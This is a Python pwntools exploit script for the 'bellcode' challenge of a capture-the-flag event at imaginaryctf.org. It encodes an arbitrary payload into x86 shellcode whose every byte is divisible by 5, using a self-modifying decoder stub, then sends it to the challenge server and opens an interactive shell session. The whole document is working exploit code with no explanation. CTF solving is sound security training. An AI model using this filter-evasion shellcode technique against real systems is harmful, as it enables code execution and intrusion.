from pwn import *

payload = open("payload.bin", "rb").read()

code = bytes()
end = bytes()

base = 0xFAC300
offset = 0x500
addr = base + offset

code += b'\xB9' + p32(addr)
code += b'\x87' + p8(0b11_001_000)

for byte in payload:
    change = byte % 5
    if change != 0:
        byte -= change
    end += p8(byte)
    for _ in range(change):
        code += b'\xFF' + p8(0b00_000_000)
    code += b'\x87' + p8(0b11_000_011)
    code += b'\xFF' + p8(0b11_000_011)
    code += b'\x87' + p8(0b11_000_011)     

code = code.ljust(offset, b'\x9B')
code += end
code += b'\x0A'

for byte in code:
    assert byte % 5 == 0

io = remote("bellcode.chal.imaginaryctf.org", 1337)

io.sendafter(b"\n", code)
io.interactive()
